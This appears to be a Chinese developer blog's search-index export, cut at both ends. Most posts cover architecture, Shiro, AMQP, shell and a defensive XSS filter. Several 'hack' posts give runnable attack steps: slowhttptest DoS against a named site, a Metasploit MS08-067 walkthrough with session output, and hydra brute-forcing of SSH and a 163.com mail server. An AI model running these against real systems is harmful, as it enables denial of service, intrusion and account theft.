当服务器使用缓存的内部语句结构时，必须注意结构不会过时。对于语句使用的对象，可能会发生元数据更改，从而导致当前对象定义与内部语句结构中表示的定义不匹配。DDL语句（例如创建，删除，更改，重命名或截断表，或分析，优化或修复表）的元数据发生更改。表内容更改（例如，使用INSERT或 UPDATE）不更改元数据，也不更改SELECT语句。 以下是问题的说明。假设客户准备此声明： 123456789101112131415161718192021222324252627282930从&apos;SELECT * FROM t1&apos;预备s1;将SELECT *内部结构扩展为表中列的列表。如果修改了表中的列集，则ALTER TABLE预准备语句将过期。如果服务器在下次客户端执行时未检测到此更改s1，则预准备语句将返回不正确的结果。为了避免由预准备语句引用的表或视图的元数据更改导致的问题，服务器会检测这些更改并在下次执行时自动重新表示该语句。也就是说，服务器重新声明语句并重建内部结构。在从表定义高速缓存中刷新引用的表或视图之后，也会发生重新分析，或者隐式地为缓存中的新条目腾出空间，或者显式由于FLUSH TABLES。同样，如果存储程序使用的对象发生更改，则服务器会重新编译程序中受影响的语句。服务器还检测表达式中对象的元数据更改。这些可能会在特定的存储方案，如语句中使用DECLARE CURSOR或流量控制语句，如 IF， CASE和 RETURN。为避免重新解析整个存储的程序，服务器仅在需要时重新编译程序中受影响的语句或表达式。例子：假设更改了表或视图的元数据。重新解析为一个发生SELECT *访问的表或视图的程序中，但不是一个 SELECT *不访问该表或视图。当语句受到影响时，如果可能，服务器仅对其进行部分重新分析。请考虑以下 CASE声明：情况case_expr 什么时候when_expr1...... 什么时候when_expr2...... 什么时候when_expr3...... ...结束案例如果元数据更改仅影响，则会重新解析该表达式。 并且其他表达式没有被重新解析。 WHEN when_expr3case_exprWHEN重新分析使用对原始转换为内部表单有效的默认数据库和SQL模式。服务器尝试最多重新解析三次。如果所有尝试都失败，则会发生错误重新分析是自动的，但在发生这种情况时，会减少准备好的语句和存储的程序性能。对于预处理语句， Com_stmt_reprepare 状态变量跟踪重新表示的数量。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里电面总结]]></title>
    <url>%2F2018%2F03%2F24%2Fessay%2Fessay-12%2F</url>
    <content type="text"><![CDATA[先说问到的东西 负载均衡 DNS LVS Nginx 常用的 原理 路由转发 数据库:分库分表.底层 dubbo 注册原理 dubbo与springcloud 区别 java常用工具包 conllection底层 IO 底层 多线程技术 executoService shell 查看网络连接 查看系统版本 从文件中找到最大数 算法:排序.负载均衡算法.缓存淘汰算法 python vb脚本 渗透. 加分项 ps:能说明你对技术感兴趣 反正大公司就是各种底层.原理.机制等等 {———-} 说下我对java的理解 concurrentHashMap 锁结构 是否能重入 spring aop spring事务 传播性 等等 分布式事务一致性 ThreadPool 就像开车一样.每个技术都是别人发明的.用规章制度才能更好的驾驭别人开发出来的武器.不要怀疑别人为什么那么写(至少你还不够那个资格).不要问为什么这么写.应该问别人为什么会这么做(是不是开起车来.更快更稳).还是那句话. 还有底层.我一个小二本.没本事入大公司法眼.自然也就不会’更’关注底层.先了解了架构.数据流向. 你至少应该明白你做的系统是个什么东西.你做的是那一块.需要什么样的性能 在这个基础上.有些人会不再钻研技术.走向管理岗位.这也是很多管理广而不细. 还有一些人开始了技术底层之路.也就是资深人士. 现在进不去没关系.以后我会的.]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于漏洞和攻击]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fabout-hack%2F</url>
    <content type="text"><![CDATA[看过一篇子电影 《没有绝对安全的系统》 首先黑客是怎么攻击一个系统的呢？一个系统又是怎么在黑客攻击下崩溃的？ 我的猜想：1、任何系统都是有代码组成、这些系统都是为人服务，需要人为输入数据进行分析、重点来了 那么这些数据有些就是正常数据、有些则可能是恶意数据、没有任何一个系统是不需要数据输入的、即便都是定制化属性有用户来进行选择、那么我们可以仿造代码进行替换、【语言这个东西又不是只有你一个人会】、2、然后通过发送请求、测试请求信息、伪造一个请求信息、写成脚本3、将请求脚本【也就是攻击脚本分发各个肉鸡】、由肉鸡进行攻击 使用肉鸡的原因有几个1、安全、不暴露攻击者本机ip【攻击时候作死：ping服务器不算】2、数量可控、可针对不同系统吞吐量 控制不同数量的肉鸡进行攻击 {———-} 那么什么是恶意数据？黑客们精心编制的一组数据、与业务代码中代码进行耦合、以早成运行器崩溃、虚拟机泄漏等等。或者早成无限循环等等]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[系统设计一些基本原则]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-0%2F</url>
    <content type="text"><![CDATA[参照梁飞–dubbo创始人—一些设计上的基本常识 不看不知道 一看吓一跳原来一个复杂的服务系统这么多门道 以前只晓得 API SPI分离。。。 1234567891011121314151617181920API 与 SPI 分离服务域/实体域/会话域分离在重要的过程上设置拦截接口重要的状态的变更发送事件并留出监听接口扩展接口职责尽可能单一，具有可组合性微核插件式，平等对待第三方不要控制外部对象的生命周期可配置一定可编程，并保持友好的 CoC 约定区分命令与查询，明确前置条件与后置条件增量式扩展，而不要扩充原始核心概念 {———-} 框架设计链接 一个架构设计、不是利用spring cloud的几个组件 串联起来就ok了、以前愚蠢地以为这就是架构 看到了梁飞的blob、发现要改变一下想法 一个架构设计、或者讲一个系统设计、或者说一个服务系统的设计、100个人来订餐、做到快、不乱、拆分菜品只是其中一项 一个系统的设计、 1、从底层的代码复用、到接口复用、到模块复用、到功能复用【模块分包原则】 2、【框架扩展原则】 暂时不太理解 3、【领域划分原则】 服务域---产品主要功能入口 spring的 beanfactory 会话域---spring bean 实体域---spring invocation 4、【接口分离原则】 5、【组件协作原则】 6、【功能演进原则】 文档地址]]></content>
      <categories>
        <category>服务架构</category>
        <category>服务设计原则</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[医院总流程图]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-2%2F</url>
    <content type="text"><![CDATA[]]></content>
      <categories>
        <category>服务架构</category>
        <category>医院架构</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[高可用架构设计考虑]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-3%2F</url>
    <content type="text"><![CDATA[123456789101112131415161718192021结合springcloud1.服务分级SOA2.流量带宽(1M17用户.按一千万并发计算需要600M带宽.当然1M17用户前提是网页数据60kb)3.数据库分层(垂直.横向是最基本的.还有灵活添加\卸载数据库).千万级别用户.数据量至少亿级别.数据库每百万分一个.至少100+数据库(若要是应对高并发.高峰流量冲击可以使用AliSQL)4.那么准备zuul网关服务器就得有(按每个tomcat并发1500计算)要考虑的点.网卡属性.tomcat支持并发.nginx支持并发(用来放在zuul前面可以支持一台服务器部署多个zuul).内存容量.cpu计算能力.内存用量和cpu计算能力 限定了数据库和tomcat计算能力.所以也不是单看一个点就能估算并发能力5.还有访问深度.访问跟踪各个服务跟踪状况.还是得学习啊 {———-} 限流12345限制瞬时并发限制总并发数限制时间窗口内平均速率相关算法：滑动窗口协议 漏桶--- 令牌桶----应对突发流量 计数器]]></content>
      <categories>
        <category>服务架构</category>
        <category>服务设计原则</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用户池系统 构思]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-4%2F</url>
    <content type="text"><![CDATA[以年龄为例task 获取数据以年龄排序 将数据以list形式存放到redis中 key 可从配置中获取 . 为了安全不建议直接把key发送到前端.可在配置做一个等价替换 不同的key对应不同的分组数据 前端访问webapp 获取key的加密值 和 默认信息列表 获取不同排序 前端发送不同的key值即可 跑批任务最后可以在redis数据失效之前把数据存储到mysql优点:1.不需要修改webapp和webview2.只需要修改跑批任务(算法添加、不同算法对应的配置更新到cloud config)3.数据存储样式可用“配置_list”存储 {———-} 问题:1.用户抢单后要削减用户列表.元列表并发存在修改问题解决:在最终抢单时候来后台查询已抢单列表就行.修不修改的有错误也没事. (使用mysql存储数据? 也不能解决这个问题 反而会触及mysql并发量问题) 目前方案:mysql主从复制.从”从sql”查询数据]]></content>
      <categories>
        <category>服务架构</category>
        <category>随笔</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[分布式架构]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-1%2F</url>
    <content type="text"><![CDATA[最近几年关于架构的信息高并发架构、异地多活架构【出自淘宝】容器化【知名docker、阿里Pouch】微服务架构【spring cloud】高可用架构弹性架构【DB中间件 需要极致的弹性】 相关的技术DevOps、应用监控、自动化运维、SOA服务治理、去IOE等等 分布式能解决的两大问题：1、系统容量更大 面对的业务量与日俱增、垂直水平拆分系统业务2、系统可用性更强 整个系统不会因为一个单点故障而导致整个系统不可用 分布式冗余节点、以消除单点故障 分布式优势：1、模块化、系统模块重用度更高2、模块化、服务开发、发布更快3、系统扩展性更高4、团队协作更有效率 {———-} 分布式存在的问题：1、设计复杂2、部署单个简单、部署多个复杂3、系统吞吐量增大、系统反应变慢4、运维复杂5、学习难度加大6、测试复杂7、技术复杂、带来维护复杂8、系统中的服务调度、监控等等复杂 分布式前景：可以说分布式是无法避免的、随着业务量的增大不可能单点跑应用、不同的应用场景会产出不用的服务架构、学习成本是逐渐加大的、等分布式更加成熟形成了体系、应该会产出更加系统的学习方案和应用方案、]]></content>
      <categories>
        <category>服务架构</category>
        <category>服务设计原则</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[风控系统]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-design%2Fdesign-5%2F</url>
    <content type="text"><![CDATA[目的监控交易、渠道产品用户、从而识别交易风险、尽早发现欺诈 功能需求实时监控、 针对各类支付业务交易风险事件进行监测与控制 同步反馈、 接受处理支付业务平台支付信息请求、并由风控系统将处理结果实时返回业务系统 联动控制、 对风控系统识别出的风险信息、进行系统自动化、通过人工预置策略实现 持续迭代、 交易风险特征识别方式可以通过系统自动整理、人工设定参数、 或者与外部资源共享等进行持续动态更新 {———-} 非功能性需求灵活性、 风控规则经常调整、由此能与不同业务系统集成 性能、 100ms异步操作、以及高吞吐量 准确性、 冻结账户以及相关交易单元 平衡点、 准确性低与大面积投诉请求、公司形象 盲点：不可以盲目追求数据一致性 风控实时引擎0--------100 不可评估-----风险值越高、风险越大 公司风控数据主要来自风控引擎 规则引擎优缺点优点：规则变动比较频繁、其他部分相对稳定 通过引入规则引擎可以结构系统与规则、提高复杂逻辑的可维护性、提高规则可理解性 风控准实时引擎某些情况下、需要通过对最近一段时间内数据分析 例：对最近半个月数据分析、 分工准实时引擎、 从消息服务器获取交易数据 对交易数据进行异步分析、 分析结果通过分控服务存入风控数据库、 供实时风控引擎评估风险 风控准实施引擎从发现异常到风控数据生效时间在100ms以内、可有效防止交易风险增大 风控系统初始建设中风控准实时引擎、 往往是通过消息监听器消息、把中间数据存储redis、对数据进行多维度分析 总结1、每月进行一次数据风控数据处理 2、实时分析引擎 3、数据落地服务 4、规则引擎：本地数据、第三方消费数据 5、奖励、处罚]]></content>
      <categories>
        <category>服务架构</category>
        <category>风控系统</category>
      </categories>
      <tags>
        <tag>服务架构</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[架构师之路]]></title>
    <url>%2F2018%2F03%2F24%2Fessay%2Fessay-10%2F</url>
    <content type="text"><![CDATA[本着对技术的兴趣 进入了软件开发行业 可以说是如鱼得水的发展 凭借着年轻 挑灯夜战 掌握了许多技术应用、但仍脱不开技术应用者的领域 如今职业发展遇到瓶颈-该思考何去何从 想来想去只有选择架构师为发展方向 怎样成为一个架构师？{———-}首先什么是架构师？ 随着互联网应用的快速发展、各个领域相继进入互联网、各种业务形式的应用、一个合理的架构应对服务流量冲击显得尤为重要 那么应用架构针对应用更好的优化、分解、先有soa、后有微服务概念、对于这个整体的请求走势要做到心中有数、到细节中每个请求的所经过的服务器心里有谱、对服务器承载能力有着清晰的认识 脑海里要有一个三维网络图 同时能细节看到某个节点内部的工作方式、又能从宏观角度看的到请求流转、敏锐感知节点中的压力点 然后针对业务领域、每个请求的频率、有一个经验教训、才能更好的使用脑海中的技术架构去整合起来业务压力 外包待出的毛病，除了用，啥都不会]]></content>
      <categories>
        <category>java</category>
        <category>essay</category>
      </categories>
      <tags>
        <tag>随笔</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DOS攻击工具]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fdos%2F</url>
    <content type="text"><![CDATA[1.slowhttptest慢速dos攻击 原理 发送一个不完整的数据包.引起服务器保留链接资源.以达成耗费服务器资源目的 {———-} 123456789101112131415161718192021222324252627282930313233bt5 r3安装过程是这样的,你先移动到根目录 运行命令：wget http://slowhttptest.googlecode.com/files/slowhttptest-1.5.tar.gz 第一条：下载tar -vxf slowhttptest-1.5.tar.gz 解压cd slowhttptest-1.5/ 进入目录./configure 再往下你懂的makemake install测试白帽攻击是这样的：slowhttptest -c 1000 -X -g -o -slow_read_stats -r 200 -w 512 -y 1024 -n 5 -z 32 -k 3 -u http://www.loveuv.net -p 3参数：—a —开始开始值范围说明符用于范围头测试-b 将字节限制的范围说明符用于范围头测试- c 的连接数限制为65539- d proxy host:port 用于指导所有流量通过web代理- e proxy host:port 端口用于指导只有探针交通通过web代理- h,B,R或x 指定减缓在头部分或在消息体,- R 允许范围检验,使慢读测试- x- g 生成统计数据在CSV和HTML格式,模式是缓慢的xxx。csv / html,其中xxx是时间和日期- i seconds 秒间隔跟踪数据在几秒钟内,每个连接- k 管道因子次数重复请求在同一连接慢读测试如果服务器支持HTTP管道内衬。- l 在几秒钟内，秒测试时间- n 秒间隔从接收缓冲区读取操作- o 文件定义输出文件路径和/或名称,如果指定有效- g- p 秒超时等待HTTP响应在探头连接后,服务器被认为是不可访问的- r seconds 连接速度- s 字节值的内容长度标题详细说明,如果指定- b- t verb 自定义- u URL 目标URL,相同的格式键入浏览器,e。g https://host[:port]/- v level 冗长等级0 - 4的日志- w 字节范围广告的窗口大小会选择从- x 字节最大长度的跟踪数据结束- y 字节范围广告的窗口大小会选择从- z 字节从接收缓冲区读取字节与单一的read()操作 也可以查看 man slowhttptest]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限系统_数据权限控制]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-permission%2Fpermission-data%2F</url>
    <content type="text"><![CDATA[1、使用 query filter 先举例说明一下数据权限，假设一个工作任务应用有以下的需求： 普通员工可以查看自己的工作项部门经理可以查看自己管理部门的所有工作项对于普通员工和部门经理，他们访问应用的入口都是相同的，应用需要根据不同的角色返回不一样的数据结果，这就是数据权限控制。 数据权限是个比较复杂的问题，规则非常灵活，在Leap中并没有内置实现，但提供了一个基础机制，可以相对简单的实现数据权限。 1.1 查询过滤器（Query Filter） 查询过滤器是 ORM 模块中的功能，默认是关闭的，开启后所有的查询语句都会在 where 语句的最后自动加上类似 @filter(User) 的表达式。 假设执行查询语句：12345select * from user u where u.name = :name那么开启 Query Filter 后将会自动变为：select * from user u where ( u.name = :name )&#123;? and ( @filter(User) )&#125;关于查询过滤器的细节在这里不展开细说，下面具体说明如何使用查询过滤器实现数据权限。 {———-} 1.2 基于 Query Filter 实现数据权限 1.3 开启 修改 src/main/resources/conf/config.xml ，增加以下配置属性：123&lt;properties prefix=&quot;orm&quot;&gt; &lt;property name=&quot;query_filter.enabled&quot; value=&quot;true&quot;/&gt;&lt;/properties&gt; 1.4 实现 123456789101112131415161718192021222324编写类 SecurityQueryFilter.java ：package hello.beans;import leap.lang.params.Params;import leap.orm.sql.Sql;import leap.orm.sql.SqlContext;import leap.orm.sql.SqlTag;import leap.orm.sql.SqlTagProcessor;public class SecurityQueryFilter implements SqlTagProcessor &#123; @Override public String processTag(SqlContext context, Sql sql, SqlTag tag, Params params) &#123; String entityName = tag.getContent(); if(entityName.equals(&quot;User&quot;)) &#123; return &quot;t.id = #&#123;env.user.id&#125;&quot;; &#125; return null; &#125;&#125;返回的表达式语法请看数据访问章节，其中别名 t. 是固定写法，在执行中会被替换为真正的别名。配置 bean 生效：&lt;bean name=&quot;filter&quot; type=&quot;leap.orm.sql.SqlTagProcessor&quot; class=&quot;hello.beans.SecurityQueryFilter&quot;/&gt; 2.使用sqlMAP进行sql拼接 其原理也是sql拼接 不写了 参考地址：http://leapframework.org/doc/security/op_perm.html]]></content>
      <categories>
        <category>java</category>
        <category>service-permission</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透的艺术]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fart-infiltration%2F</url>
    <content type="text"><![CDATA[分类 描述内容 信息收集 收集域名、服务器ip、指纹 漏洞挖掘 组件指纹、应用层 漏洞利用 目的、ddos、 权限提升 提升shell权限 后门 留下下次访问后门 肉鸡 日志清扫 删除系统日志 经验总结 记录攻击漏洞、肉鸡ip {———-} 别人总结的 如有侵犯 请私信 哈哈．．．]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AMQP]]></title>
    <url>%2F2018%2F03%2F24%2Fagreement%2Famqp%2F</url>
    <content type="text"><![CDATA[AMQP，即Advanced Message Queuing Protocol、高级队列消息协议 一个提供统一消息服务的应用层标准高级消息队列协议,是应用层协议的一个开放标准,为面向消息的中间件设计。基于此协议的客户端与消息中间件可传递消息，并不受客户端/中间件不同产品，不同的开发语言等条件的限制。Erlang中的实现有 RabbitMQ等。 协议特性 123451、消息方向2、消息队列3、消息路由4、消息可靠性5、消息安全性 {———-} 协议元素 1234561、producer---生产者2、consumer---消费者3、virtual host --虚拟主机4、exchange----交换器5、queue----消息队列6、message--消息 定义了 消息发送过程 以及消息系统必须的特性和具体的消息流转实现 发送方式 可以看看RabbitMQ 消息发送流程rabbitMQ严格按照AMQP协议定制实现的]]></content>
      <categories>
        <category>java</category>
        <category>agreement</category>
      </categories>
      <tags>
        <tag>协议</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[权限系统_shiro_授权流程]]></title>
    <url>%2F2018%2F03%2F24%2Fservice-permission%2Fshiro-1%2F</url>
    <content type="text"><![CDATA[Shiro Authorization （ 授权） 官方授权图片 步骤： 授权成功后 关于权限使用有三种方式 1、编写代码 2、JDK标签 {———-} 3、JSPGSP标签库 这里要解释下 RBAC 以前的RBAC是 Role-Based-Access-Control 基于角色的访问控制 权限表 是 用户表-角色表-操作url表 【Menu】 控制方式是 用户拥有某权限——–权限拥有某url【controller】 才可以访问 麻烦点就是 后台判断用户是否拥有权限时，判断用户角色 那么就是把角色和资源绑定到一起、这样后期开发会发生这么一种情况、就是有个默认角色后期我可能要删除、使用新角色来控制这些资源、那么 到时候就要更新代码重新发布 而最新的RBAC是 Resource-Based-Access-Control 基于资源的访问控制 权限表是 用户表【user】-角色表-功能许可表【Permission】 控制方式就是 用户拥有某一角色——–角色拥有这一资源许可——-资源许可和代码【controller】绑定在一起 后期要更改角色权限 就把这个角色删掉就可以了 并不会影响代码 不需要重构代码 shiro中同时使用两种方式进行 权限判断 用户可以自行选择 相关使用方法 参加xmind]]></content>
      <categories>
        <category>java</category>
        <category>service-permission</category>
      </categories>
      <tags>
        <tag>权限认证</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Filter安全过滤高级最终行（XSS攻击）]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Ffilter-xss%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455package com.what21.filter.xss;import java.io.IOException;import java.util.LinkedHashMap;import java.util.Map;import javax.servlet.Filter;import javax.servlet.FilterChain;import javax.servlet.FilterConfig;import javax.servlet.ServletException;import javax.servlet.ServletRequest;import javax.servlet.ServletResponse;import javax.servlet.http.HttpServletRequest;public class XSSFilter implements Filter &#123; // XSS处理Map private static Map&lt;String,String&gt; xssMap = new LinkedHashMap&lt;String,String&gt;(); public void init(FilterConfig filterConfig) throws ServletException &#123; // 含有脚本： script xssMap.put(&quot;[s|S][c|C][r|R][i|C][p|P][t|T]&quot;, &quot;&quot;); // 含有脚本 javascript xssMap.put(&quot;[\\\&quot;\\\&apos;][\\s]*[j|J][a|A][v|V][a|A][s|S][c|C][r|R][i|I][p|P][t|T]:(.*)[\\\&quot;\\\&apos;]&quot;, &quot;\&quot;\&quot;&quot;); // 含有函数： eval xssMap.put(&quot;[e|E][v|V][a|A][l|L]\\((.*)\\)&quot;, &quot;&quot;); // 含有符号 &lt; xssMap.put(&quot;&lt;&quot;, &quot;&amp;lt;&quot;); // 含有符号 &gt; xssMap.put(&quot;&gt;&quot;, &quot;&amp;gt;&quot;); // 含有符号 ( xssMap.put(&quot;\\(&quot;, &quot;(&quot;); // 含有符号 ) xssMap.put(&quot;\\)&quot;, &quot;)&quot;); // 含有符号 &apos; xssMap.put(&quot;&apos;&quot;, &quot;&apos;&quot;); // 含有符号 &quot; xssMap.put(&quot;\&quot;&quot;, &quot;\&quot;&quot;); &#125; public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException &#123; // 强制类型转换 HttpServletRequest HttpServletRequest httpReq = (HttpServletRequest)request; // 构造HttpRequestWrapper对象处理XSS HttpRequestWrapper httpReqWarp = new HttpRequestWrapper(httpReq,xssMap); // chain.doFilter(httpReqWarp, response); &#125; public void destroy() &#123; &#125;&#125; {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172=============================package com.what21.filter.xss;import java.util.Map;import java.util.Set;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletRequestWrapper;public final class HttpRequestWrapper extends HttpServletRequestWrapper &#123; private Map&lt;String, String&gt; xssMap; public HttpRequestWrapper(HttpServletRequest request) &#123; super(request); &#125; public HttpRequestWrapper(HttpServletRequest request, Map&lt;String, String&gt; xssMap) &#123; super(request); this.xssMap = xssMap; &#125; @Override public String[] getParameterValues(String parameter) &#123; String[] values = super.getParameterValues(parameter); if (values == null) &#123; return null; &#125; int count = values.length; // 遍历每一个参数，检查是否含有 String[] encodedValues = new String[count]; for (int i = 0; i &lt; count; i++) &#123; encodedValues[i] = cleanXSS(values[i]); &#125; return encodedValues; &#125; @Override public String getParameter(String parameter) &#123; String value = super.getParameter(parameter); if (value == null) &#123; return null; &#125; return cleanXSS(value); &#125; public String getHeader(String name) &#123; String value = super.getHeader(name); if (value == null) return null; return cleanXSS(value); &#125;/** * 清除恶意的XSS脚本 * * @param value * @return */ private String cleanXSS(String value) &#123; Set&lt;String&gt; keySet = xssMap.keySet(); for(String key : keySet)&#123; String v = xssMap.get(key); value = value.replaceAll(key,v); &#125; return value; &#125;&#125; 123456789=============================================================================&lt;filter&gt; &lt;filter-name&gt;XSSFilter&lt;/filter-name&gt; &lt;filter-class&gt;com.what21.filter.xss.XSSFilter&lt;/filter-class&gt;&lt;/filter&gt;&lt;filter-mapping&gt; &lt;filter-name&gt;XSSFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/*&lt;/url-pattern&gt;&lt;/filter-mapping&gt;]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[crontab]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fcrontab%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223/crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置&lt;/pre&gt;service crond statusservice crond start查看crontab服务是否已设置为开机启动，执行命令：ntsysv加入开机自动启动：chkconfig -level 35 crond on定制脚本crontab -e 相当于vim文档加入0 1 * * * root /data/bakdb.sh &gt; /data/bak.log 2&gt;&amp;1*/2 * * * * /bin/bash -x /shell/web_monit/http_monit.sh &gt; /dev/null 2&gt;&amp;1查看定时任务crontab -u root -l]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java后台常用命令]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fshell-1%2F</url>
    <content type="text"><![CDATA[1234567891011121314151617181920212223242526272829303132cdpsps -efps -ef | grep &quot;&quot;| 管道符#移动文件mv /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db#复制文件cp /usr/bin/mysql.db /var/data/mysql/mysql-2017-09-09.db.backup#复制文件夹cp -a /usr/bin/ /var/data/mysql/ mkdir New_Dir mkdir -p New_Dir/Sub_Dir/Under_Dir sh .../*.shvim 123.txttail -f ../*.log tail -f -n1000 ../*.log#压缩tar -zcvf test.tar.gz ./test/#解压tar xzvf test.tar.gz]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java后台升级命令]]></title>
    <url>%2F2018%2F03%2F24%2Fshell%2Fshell-2%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637383940414243topnetstatnetstat -ano | grep 8080killkill -9#读写执行 all userchmod 777 123.txt#当前用户执行权限chmod +x git_pull.shchown root:root 123.txtsudo apt-get installsudo apt-get removesudo yum installsudo yum removesudo yum -y installsudo -s -Hsu rootunzip -d 123.ziptouch readme.txtcat readme.txtmore readme.txtless readme.txtsort readme.txt磁盘空间du -hdf -hlsof | grep deleted 1234567891011121314151617181920212223242526cat /proc/versionawkif..elsesleepmanlsof -i:8080useradd -r nexus# 打印关键字行grep -n &quot;业务有关的关键字&quot; 2018-06-26.log #文件切割 开始2行、结束6行sed -n &apos;2,6p&apos; access.log &gt; new-access.log#统计文件内容出现次数grep -o &quot;message&quot; nohup.out | wc -l#scp远程拷贝scp -r /usr/local/mongodb-3.6.5/ root@10.44.33.22:/opt/software/]]></content>
      <categories>
        <category>shell</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用Metasploit入侵windows]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fmetasploit-hack-windows%2F</url>
    <content type="text"><![CDATA[使用msfconsole 查看window发布的漏洞 运气好的话 你要破解的windows没有打补丁.那么使用该漏洞你就可以直接登陆到windows了 12345678910111213141516171819202122232425262728# msfconsolemsf &gt; search platform: windows xp sp3msf &gt; search platform: windows 10msf &gt; search platform: androidmsf &gt; info exploit/windows/smb/ms08_067_netapi使用info查看漏洞信息.msf &gt; use exploit/windows/smb/ms08_067_netapi&gt; set payload windows/meterpreter/bind_tcp&gt; set RHOST 192.168.0.108 (设置目标主机IP地址)&gt; exploit设定攻击方式.攻击ip攻击成功:[*] Started bind handler[*] Automatically detecting the target...[*] Fingerprint: Windows XP SP3 - Service Pack 3 - lang:Chinese[*] Selected Target: Windows XP SP3 Chinese (AlwaysOn NK)[*] Attempting to trigger the vulnerability...[*] Sending stage (751104 bytes) to 192.168.0.108[*] Meterpreter session 1 opened (192.168.0.1:41614 -&gt; 192.168.0.108:4444) at 2016-04-15 17:29:32meterpreter &gt;失败就尝试其他漏洞]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ssh远程登陆破解]]></title>
    <url>%2F2018%2F03%2F24%2Fhack%2Fssh-violence%2F</url>
    <content type="text"><![CDATA[利用ssh协议 暴力破解ssh密码 12345#hydra -s 22 -v -l root -P /usr/share/wordlists/rockyou.txt 192.168.0.108 sshssh 端口22 破解# hydra -S -l test@163.com -P /usr/share/wordlists/rockyou.txt -e ns -V -s 465 -t 1 smtp.163.com smtp邮箱破解 现在都加了许多验证.怕是不太靠谱了]]></content>
      <categories>
        <category>hack</category>
      </categories>
      <tags>
        <tag>安全客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[自定义注解]]></title>
    <url>%2F2018%2F03%2F24%2Fjdk%2Fjdk-annotation%2F</url>
    <content type="text"><![CDATA[12345678910111213141516171819202122232425262728293031323334353637/** * * @author 无心 * @date 2018-05-08 10:10:10 * 文档id */@Inherited@Documented@Retention(RetentionPolicy.RUNTIME)@Target(ElementType.FIELD)public @interface DocId &#123;&#125;@Documented@Inherited@Retention(RetentionPolicy.RUNTIME)@Target(&#123;ElementType.TYPE&#125;)public @interface Document &#123; //必须为小写 String index(); //分片数量 int shards() default 5; //副本数 int replicas() default 1; //数据刷新 String refreshInterval() default &quot;1s&quot;; //存储类型 String indexStoreType() default &quot;fs&quot;;&#125; {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140/** * @author 无心 * @date 2018-05-08 10:10:10 * 注解获取封装 */public class FieldUtil &#123; public static void main(String [] args) throws IllegalAccessException, InstantiationException, NoSuchFieldException &#123; MedCheckDoc medCheckDoc = new MedCheckDoc(); String string = getDocType(medCheckDoc.getClass()); System.err.print(string); &#125; /** * 获取Document注解中的值 * @param clazz * @return */ public static String getDocIndex(Class clazz)&#123; Document document = (Document) clazz.getAnnotation(Document.class); return document.index(); &#125; /** * 获取Document注解中的值 * @param clazz * @return */ public static int getDocShards(Class clazz)&#123; Document document = (Document) 